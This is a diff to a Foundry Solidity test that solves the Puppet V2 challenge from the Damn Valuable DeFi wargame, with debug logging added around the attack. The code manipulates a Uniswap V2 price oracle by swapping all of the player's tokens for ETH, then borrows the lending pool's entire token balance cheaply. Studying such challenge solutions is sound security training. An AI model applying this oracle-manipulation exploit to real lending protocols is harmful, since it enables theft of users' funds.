@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
@@ -103,8 +104,13 @@ contract PuppetV2Challenge is Test {
         path[0] = address(token);
         path[1] = address(weth);
 
-        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        console.log('---------- BEFORE SWAP ----------');
+        uint ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DepositOfWETHRequired is: %s", ethRequired);
+        console.log("Player's eth balance is : %s", player.balance);
 
+        console.log("---------- SWAPPING ----------");
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         uniswapV2Router.swapExactTokensForETH(
             PLAYER_INITIAL_TOKEN_BALANCE, 
             0, 
@@ -113,9 +119,12 @@ contract PuppetV2Challenge is Test {
             block.timestamp*2
         );
 
-        uint playerBalance = player.balance;
-        uint ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        require(playerBalance > ethRequired);
+        console.log('---------- AFTER SWAP ----------');
+        ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DepositOfWETHRequired is: %s", ethRequired);
+        console.log("Player's eth balance is : %s", player.balance);
+
+        require(player.balance > ethRequired);
 
         weth.deposit{value:ethRequired}();
         weth.approve(address(lendingPool), ethRequired);
@@ -123,7 +132,6 @@ contract PuppetV2Challenge is Test {
 
         token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
-
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
